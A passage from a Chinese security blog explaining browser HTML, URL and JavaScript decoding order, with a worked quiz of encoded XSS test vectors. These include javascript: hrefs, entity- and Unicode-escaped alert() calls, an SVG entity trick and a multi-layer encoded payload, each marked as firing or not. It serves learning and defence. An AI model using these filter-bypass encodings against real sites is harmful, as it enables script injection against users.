<strong>调用</strong></li><li><strong>定时器触发</strong></li></ul></blockquote><p><code>Unicode转义序列出现的地方</code></p><blockquote><p>从上下文来看，可以分为三个地方：<strong>字符串中，标识符名称中和控制字符（(,),;,&quot;,'等）中。</strong></p><ul><li>字符串中：转义序列只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。</li><li>标识符名称中：转义序列会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。</li><li>控制字符中：转义序列将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。</li></ul><p>JavaScript解析时只有<strong>标识符名称</strong>不会被当做字符串，<strong>控制字符</strong>仅会被解析为标示符名称或者字符串。</p><p>Javascript解析器工作的时候可以将\u0061\u006c\u0065\u0072\u0074进行js解码后为“alert”，而“alert”是一个有效的标识符名称，它是能被正常解析的。像圆括号、双引号、单引号等等这些控制字符，在进行JavaScript解析的时候仅会被解码为字符串文本或者上面讲的标识符名称，不能作为控制字符解析。</p></blockquote><p><code>JavaScript 解析器</code><sup>[0x04]</sup></p><blockquote><p>形如 \uXXXX 这样的 Unicode 字符转义序列或 Hex 编码是否能被解码需要看情况。 首先，JavaScript 中有三个地方可以出现 Unicode 字符转义序列：</p><p>1、字符串中（in String）</p><p>      Unicode 转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。</p><p>      例如，<code>&lt;script&gt;alert(“\u0031\u0030″);&lt;/script&gt;</code></p><p>      被编码转义的部分为 10，是字符串，会被正常解码，JS 代码也会被执行。</p><p>2、标识符中（in identifier names）</p><p>      若 Unicode 转义序列存在于标识符中，即变量名（如函数名等…），它会被进行解码。</p><p>      例如，<code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</code></p><p>      被编码转义的部分为 alert 字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS 代码也会被执行。</p><p>3、控制字符中（in control characters）</p><p>      若 Unicode 转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。 控制字符即’、”、()等。</p><p>      例如，<code>&lt;script&gt;alert\u0028″xss”);&lt;/script&gt;</code>，(进行了 Unicode 编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分alert(。</p><p>      因此函数的括号之类的控制字符进行 Unicode 转义后是不能被正常解释的。</p></blockquote><p><code>例题</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(\u0031)"</span>)&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('\u0031')"</span>)&gt;</span>test2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(1)"</span>)&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"</span>)&gt;</span>test4<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)"</span>)&gt;</span>test5<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript\u003aalert(1)"</span>)&gt;</span>test6<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('1\u000a')"</span>)&gt;</span>test7<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">测试</th><th style="text-align:center">结果</th></tr></thead><tbody><tr><td style="text-align:center">test</td><td style="text-align:center">弹框</td></tr><tr><td style="text-align:center">test1</td><td style="text-align:center">失败，解析为字符串1，需要单引号<br>// 之所以添加单引号，是因为 JS 解码后的结果只能为子字符串或标识符 //</td></tr><tr><td style="text-align:center">test2</td><td style="text-align:center">弹框，编码 ’ 则失败</td></tr><tr><td style="text-align:center">test3</td><td style="text-align:center">弹框</td></tr><tr><td style="text-align:center">test4</td><td style="text-align:center">失败，编码括号</td></tr><tr><td style="text-align:center">test5</td><td style="text-align:center">失败，URL解码时，不以javascript伪协议解析，寻找根目录下链接</td></tr><tr><td style="text-align:center">test6</td><td style="text-align:center">失败，同上，寻找相对路径链接</td></tr><tr><td style="text-align:center">test7</td><td style="text-align:center">弹框，可以添加换行符，不受影响。\u000a：换行符</td></tr></tbody></table><p><code>个人理解</code></p><blockquote><ul><li>javascript 解码后的结果是<code>字符串</code>或者是<code>标识符名称</code>，</li><li>控制符有 <code>(</code>、<code>)</code>、<code>;</code>、<code>&quot;</code> 和 <code>'</code> 等</li></ul></blockquote><p><code>javascript 解码本质</code></p><blockquote><p><font color="red"><strong>Unicode 序列不能出现在控制字符中，否则不能被解释。</strong></font></p></blockquote><h4 id="0x03-url-解码"><a class="markdownIt-Anchor" href="#0x03-url-解码"></a> 0x03 URL 解码</h4><blockquote><ol><li><p><code>&lt;a href=&quot;%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29&quot;&gt;test1&lt;/a&gt;</code></p><p><font color="brown">URL解析过程中的一个细节：<strong>URL 不能对协议类型进行任何的编码操作</strong>，否则URL解析器会认为它无类型，就导致上述被编码的“javascript”没有解码，当然不会被URL解析器识别了。</font></p></li><li><p>src 中是可以进行 URL 编码的，当输出环境在 href     或者 src 属性内时，可通过javascript 伪协议来执行 JS 代码 。</p></li><li><p>html中的 <code>&lt;a&gt;</code> 标签的 href 属性，url 解析器会对 href 内部的内容进行一次url解析，js中的window.open(),url解析器会对括号内部的内容进行一次url解析，URL解析过程中的一个细节了，不能对伪协议类型进行任何的编码操作，否则URL解析器会认为它无类型。这个协议类型的格式是javascript:不是只是javascript。除此了javascript:伪协议可以执行js代码之外，还有IE下的vbscript,Mozilla下的dataURL(data:text/html;这里可以直接添加html的<code>&lt;script&gt;</code>标签，会执行)</p></li></ol></blockquote><p><code>小知识点：URL 的格式</code></p><p><img src="/images/95-1.png" alt></p><center><b>[协议名]://[用户名]:[密码]@[主机名]:[端口]/[路径]?[查询参数]#[片段 ID]</b></center>> - 首先，要注意的是 URL 的 Scheme 部分（协议部分）必须为 ASCII 字符，即不能被任何编码，否则 URL 解析器的状态机将进入 No Scheme 状态。>   示例1：`<a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"></a>`>> - URL 编码部分的是javascript:alert(1)，但是 JS 不会被执行，因为作为 Scheme 部分的”javascript”这个字符串被编码（其中javascript是一种伪协议），导致 URL 解析 器状态机进入 No Scheme 状态。> - URL 中的 : （冒号）也不能被以任何方式编码，否则 URL 解析器的状态机也将进入 No Scheme 状态。`<a href="javascript%3aalert(3)"></a>`>   由于 : (冒号)被 URL 编码为%3a，导致 URL 状态机进入 NoScheme 状态，JS 代码不能执行。> - 示例2：`<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29"></a>`> - “JavaScript” 这个字符串被实体化编码，: （冒号）没有被编码，alert(2) 被 URL编码，成功执行。首先，在 HTML 解析器中，HTML状态机处于属性值状态（Attribute Value State）时，字符实体时会被解码的，此处在 href 属性中，所以被实体化编码的 “javascript”字符串会被解码。其次，HTML 解析是在URL解析之前的，所以在进行 URL 解析之前，Scheme 部分的”javascript”字符串已被解码，而并不再是被实体编码的状态。<h4 id="0x04-相关实践"><a class="markdownIt-Anchor" href="#0x04-相关实践"></a> 0x04 相关实践</h4><p><img src="/images/95-3.png" alt></p><p><img src="/images/95-2.png" alt></p><h3 id="font-color-navy三-详解每条原因font"><a class="markdownIt-Anchor" href="#font-color-navy三-详解每条原因font"></a> <font color="navy">三、详解每条原因</font></h3><p><code>0x01</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹出。因为 <code>“%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29”</code> 是 <code>URL</code> 编码，在 HTML 解析上述语句所得到的还是该语句本身，而 <code>URL</code> 编码在编码 <code>URL</code> 时，要求 <code>URL</code> 的 <code>Scheme</code>  部分（协议部分）必须为 <code>ASCII 字符</code>，即不能被任何编码，否则 <code>URL 解析器</code>的状态机将进入 <code>No Scheme 状态</code>。所以作为Scheme 部分的 <code>”javascript”</code> 这个字符串被编码（其中 <code>javascript</code> 是一种伪协议），导致 <code>URL 解析器</code>状态机进入 <code>No Scheme 状态</code>。</p></blockquote><p><code>0x02</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61</span></span></span><br><span class="line"><span class="tag"><span class="string">%6c%65%72%74%28%32%29"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能正常弹出。因为 <code>&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&quot;</code> 是实体编码，所以在 <code>HTML 解析器</code> 解析后，上述实体编码被解码为 <code>javascript</code>，上述语句变为<code>&lt;a href=&quot;JavaScript:%61%6c%65%72%74%28%32%29&quot;&gt;</code>，这个时候 <code>URL 解析器</code>  遇见 <code>javascript:</code> 就会对后面的 <code>URL 编码</code> 解码，变为如下语句 <code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code> ，所以成功弹窗。</p></blockquote><p><code>0x03</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript%3aalert(3)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。虽然 <code>JavaScript</code> 没有被编码，但是 <code>URL 解析器</code> 在编码时是对 <code>javascript:</code> 识别状态，不是 <code>javascript</code>，所以 <code>URL 解析器</code>的状态机将进入 <code>No Scheme 状态</code>，所以不会弹窗。</p></blockquote><p><code>0x04</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。</p><ul><li><p><font color="red"><strong>分析一</strong></font>：HTML 解析过程：<code>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个'&lt;'符号（后面没有跟'/'符号）就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”......最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。这里有三种情况可以容纳字符实体，“数据状态中的字符引用”，“RCDATA 状态中的字符引用”和“属性值状态中的字符引用”。在这些状态中HTML字符实体将会从“&amp;#...”形式解码，对应的解码字符会被放入数据缓冲区中。</code>在该问题中，“<code>&lt;</code>”和“<code>&gt;</code>”字符被编码为“<code>&amp;#60;</code>”和“<code>\&amp;#62;</code>”。当解析器解析完“<code>&lt;div&gt;</code>”并处于“数据状态”时，这两个字符将会被解析。当解析器遇到“&amp;”字符，它会知道这是“数据状态的字符引用”，因此会消耗一个字符引用（例如 “<code>&amp;#60;</code>” ）并释放出对应字符的 <code>token</code>。在这个例子中，对应字符指的是 “<code>&lt;</code>” 和 “<code>&gt;</code>” 。读者可能会想：这是不是意味着“<code>&lt;</code>”和“<code>&gt;</code>”的 <code>token</code> 将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到“标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成 “数据”。</p></li><li><p><font color="red"><strong>分析二</strong></font>：&lt;和&gt;被编码为字符实体&lt;和&gt;。 当 HTML 解析器解析完<div>时，会进入数据状态（Data State）并发布标签令牌。接着解析到实体&lt;时因为处在数据状态（Data State）就会对实体进行解码为&lt;，后面 的&gt;同样道理被解码为&gt;。因为解析器在使用字符引用后不会转换到标签打开状态（Tag OpenState），不进入标签打开状态就不会被发布为 HTML 标签。因此，不会创建新 HTML 标签， 只会将其作为数据来处理。 这也是为什么我们可以使用字符实体来避免用户不安全输入导致 XSS 的原因。</div></p></li></ul></blockquote><p><code>0x05</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗，但是能够被解码。因为 <code>textarea</code> 和 <code>title</code> 标签名称是 <code>RCDATA</code>  元素<sup>[0x07]</sup>，但是处于 <code>RCDATA State</code> 状态时，<font color="brown"><strong>字符实体是会被解析器解码的。</strong></font>所以上述的语句会被解码成下述语句 <code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code> ，但是里面的 JS 同样还是不会被执行，原因还是因为解码字符实体状态机不会进入<code>标签打开状态（TagOpen State）</code>，因此里面的 <code>&lt;script&gt;</code> 并不会被解析为 HTML 标签。</p><p><img src="/images/95-4.png" alt></p></blockquote><p><code>0x06</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(6)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。和 <code>0x05</code> 的解释差不多，在 <code>RCDATA</code>元素内，字符实体状态机不会进入<code>标签打开状态（TagOpen State）</code>，因此里面的 <code>&lt;script&gt;</code> 并不会被解析为 HTML 标签。所以不会弹窗。</p><p><img src="/images/95-5.png" alt></p></blockquote><p><code>0x07</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('7&amp;#39;);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>待续</p></blockquote><p><code>0x08</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('8\u0027);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>待续</p></blockquote><p><code>0x09</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#57;&amp;#41;&amp;#59;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。因为在<code>原始文本元素</code>（<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>）类型标签下的所有字符实体编码都不会被 HTML 解码。因此上述语句不会被解码。</p></blockquote><p><code>0x0A-</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#57;&amp;#41;&amp;#59;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能弹窗。<sup>[0x08] &amp; [0x09]</sup></p><p><img src="/images/95-6.jpg" alt></p><ul><li><p><font color="red"><strong>分析一</strong></font>：因为 <code>&lt;svg&gt;</code> 属于 <code>XML</code> 元素，不是 <code>HTML</code> 标签，因为下 xml 支持在标签内解析HTML实体字符，所以实体编码在 XML 中会被解析，并被执行。在 XML 中实体会自动转义，除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体。</p></li><li><p><font color="red"><strong>分析二</strong></font>：待续</p></li></ul></blockquote><p><code>0x0A</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能弹窗。因为<font color="red"><strong>Unicode 序列不能出现在控制字符中，否则不能被解释。</strong></font>而 <code>\u0061\u006c\u0065\u0072\u0074</code> 中没有控制符，将 <code>Unicode</code> 解码后成为 <code>alert</code> ，它只是标识符</p></blockquote><p><code>0x0B</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不会弹窗。<code>javascript</code>解码器会将 <code>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</code> 解码为 <code>alert(1)</code>，该结果中的控制字符<code>(</code> 和 <code>)</code> 被编码了，所以不能被正常解释。</p></blockquote><p><code>0x0C</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。被编码部分为 alert 及括号内为12。原因在于括号内被编码的部分不能被正常解释，即使反编码之后为数字，但是仍然按照<code>字符串</code>来处理（<font color="navy"><strong>这里的12为字符串12，并不是int整数</strong></font>）。要么使用 ASCII 数字，要么加” &quot;或’ '使其变为字符串，作为字符串也只能作为普通字符。</p></blockquote><p><code>0x0D</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能被执行。<code>\u0027</code> 被编码为 <code>'</code> ，该符号属于控制字符，所以这里控制字符被编码了，解码后的 <code>'</code> 将<strong>变为字符串的一部分，而不再解释为控制字符</strong>。因此该例中字符串是不完整的，因为没有 <code>'</code> 来结束字符串。</p></blockquote><p><code>0x0E</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'14\u000a'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能被成功执行。和 <code>0x0D</code> 进行对比可知，这里有 <code>'</code> 符号作为控制字符来结束字符串，所以能够被执行。</p></blockquote><p><code>0x0F</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能被执行。分析过程如下：</p><p><code>步骤 ①</code> ：首先是HTML 解析，将 <code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;</code>  解码为 <code>javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code></p><p><code>步骤 ②</code> ：因为 <code>href</code> 属性，因为存在着 <code>javascript:</code> 伪协议，所以紧接着进行 <code>URL 解析</code>，将 <code>javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code> 解析为 <code>javascript:\u0061\u006c\u0065\u0072\u0074(15)</code></p><p><code>步骤 ③</code>：最后通过 <code>javascript 解析器</code> 将 <code>javascript:\u0061\u006c\u0065\u0072\u0074(15)</code>  解码为 <code>javascript:alert(15)</code> ，所以最终得到的结果是 <code>&lt;a href=javascript:alert(15)&gt;&lt;/a&gt;</code>，在<code>Unicode</code> 解码过程中，并没有控制字符被编码，所以 <code>javascript:alert(15)</code> 能成功地被执行。</p></blockquote><h3 id="font-color-navy四-参考文献font"><a class="markdownIt-Anchor" href="#font-color-navy四-参考文献font"></a> <font color="navy">四、参考文献</font></h3><p><strong>0x01</strong> 深入理解浏览器解析机制和XSS向量编码：<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p><p><strong>0x02</strong> 浏览器渲染原理与编码解码：<a href="https://lalajun.github.io/2018/08/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/#unicode%E7%BC%96%E7%A0%81-javascript%E8%A7%A3%E6%9E%90%E5%99%A8" target="_blank" rel="noopener">https://lalajun.github.io/2018/08/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/#unicode%E7%BC%96%E7%A0%81-javascript%E8%A7%A3%E6%9E%90%E5%99%A8</a></p><p><strong>0x03</strong> 浏览器编码题目：<a href="http://test.attacker-domain.com/browserparsing/answers.txt" target="_blank" rel="noopener">http://test.attacker-domain.com/browserparsing/answers.txt</a></p><p><strong>0x04</strong> 一次对浏览器解析和XSS的深度探究：<a href="https://www.freebuf.com/articles/web/222849.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/222849.html</a></p><p><strong>0x05</strong> 深入探究浏览器编码及XSS Bypass：<a href="https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA</a></p><p><strong>0x06</strong> XSS与字符编码及浏览器解析原理：<a href="http://www.lin2zhen.top/index.php/archives/16/" target="_blank" rel="noopener">http://www.lin2zhen.top/index.php/archives/16/</a></p><p><strong>0x07</strong> HTML5/syntax：<a href="https://www.w3.org/html/ig/zh/wiki/HTML5/syntax" target="_blank" rel="noopener">https://www.w3.org/html/ig/zh/wiki/HTML5/syntax</a></p><p><strong>0x08</strong> SVG XSS的一个黑魔法：<a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></p><p><strong>0x09</strong> 图片XSS小结：<a href="https://www.mi1k7ea.com/2019/03/22/%E5%9B%BE%E7%89%87XSS%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/03/22/%E5%9B%BE%E7%89%87XSS%E5%B0%8F%E7%BB%93/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy一-判断下列语句能否成功执行font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy一-判断下列语句能否成功执行font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;一、
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【转载】文件 HOSTS 的简介和修改方法</title>
    <link href="https://muzibing.github.io/2020/02/23/2020.02.23%EF%BC%8893%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/23/2020.02.23（93）/</id>
    <published>2020-02-22T16:00:00.000Z</published>
    <updated>2020-02-23T00:43:23.868Z</updated>
    
